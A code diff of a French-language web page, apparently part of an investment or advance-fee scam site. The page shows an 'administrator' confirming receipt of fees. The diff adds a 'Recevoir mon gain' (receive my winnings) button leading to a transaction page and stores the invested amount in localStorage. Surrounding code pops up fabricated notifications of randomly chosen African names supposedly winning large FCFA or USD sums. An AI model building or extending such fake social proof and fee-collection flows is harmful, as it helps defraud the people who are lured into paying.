@@ -1,3 +1,4 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -411,6 +412,8 @@
       <p>L’administrateur a confirmé la réception des frais et validé votre transaction.</p>
       <p>Le montant sera versé selon les modalités convenues.</p>
       <p>Pour toute question supplémentaire, contactez de nouveau l’administrateur.</p>
+      <!-- NOUVEAU BOUTON Recevoir mon gain -->
+      <button id="receiveGainBtn">Recevoir mon gain</button>
     </div>
   </div>
 
@@ -500,7 +503,7 @@
     }
 
     document.addEventListener('DOMContentLoaded', () => {
-      // Population du select pays et gestion indicatif + longueur
+      // Population du select pays et gestion indicatif + longueur de numéro (initial)
       const countrySelect = document.getElementById('country');
       const phonePrefixSpan = document.getElementById('phone-prefix');
       const phoneInput = document.getElementById('phone');
@@ -637,6 +640,9 @@
 
           // Marquer localStorage
           localStorage.setItem('hasSubmitted', 'true');
+          // Optionnel : stocker montant/devise pour pré-remplissage transaction.html
+          localStorage.setItem('lastInvestAmount', amount);
+          localStorage.setItem('lastInvestCurrency', currency);
 
           // Lancer modal + progression jusqu’à 90% + message
           showProgressModal(bonusValue, feeValue, currency);
@@ -671,6 +677,14 @@
           }
           if (confirmError) confirmError.style.display = 'none';
           showFinalProgress();
+        });
+      }
+
+      // Ajout du listener pour le bouton Recevoir mon gain
+      const receiveGainBtn = document.getElementById('receiveGainBtn');
+      if (receiveGainBtn) {
+        receiveGainBtn.addEventListener('click', () => {
+          window.location.href = 'transaction.html';
         });
       }
 
@@ -765,10 +779,8 @@
         scheduleNext();
       }
       function showRandomNotification() {
-        // Choix aléatoire de nom
         const name = africanNames[randInt(0, africanNames.length - 1)];
-        // Choix aléatoire de devise et montant
-        const useFCFA = Math.random() < 0.6; // 60% FCFA, 40% USD
+        const useFCFA = Math.random() < 0.6;
         let amount, currency;
         if (useFCFA) {
           amount = randInt(500000, 5000000);
@@ -782,7 +794,6 @@
         notif.className = 'notif';
         notif.textContent = text;
         notifContainer.appendChild(notif);
-        // Supprimer après animation (~3s)
         setTimeout(() => {
           if (notif.parentNode) notif.parentNode.removeChild(notif);
         }, 3000);
